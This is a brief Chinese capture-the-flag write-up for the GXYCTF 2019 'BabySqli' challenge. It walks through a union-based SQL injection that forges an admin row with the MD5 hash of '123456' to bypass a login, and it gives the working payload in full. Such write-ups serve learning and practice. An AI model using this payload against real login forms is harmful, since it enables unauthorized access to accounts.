## [GXYCTF 2019]BabySqli

根据提示有以下语句（先base32再base64）

```
select * from user where username = '$name'
```

可以先爆破用户名为'admin'时，存在一组数据，其余时没有数据

```
我们可以先用大小写绕过，单引号闭合爆破出列数，也可直接union select 1,2,3#检测出列数为三列
```

先尝试寻常的sql注入，但是括号都被过滤了

```
有一种其他的方法，我们知道执行select * from user where username = '$name'语句会得到一组用户数据
```

这里只能猜，查询到的第二列数据应该作为用户名，第三列数据作为密码，账号为admin且输入的密码为sql查询中所显示的密码，所以构造paylaod：

```
name=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e' %23&pw=123456

1.union select相当于在表中多列了一行
2.不能为admin而1是因为我们需要查询数据为空，从而使union select 构造的数据能被选取出
3.e10adc3949ba59abbe56e057f20f883e为123456的md5值，一般密码都会通过md5值加密（这也是猜的，建议用php自带的md5函数）
```

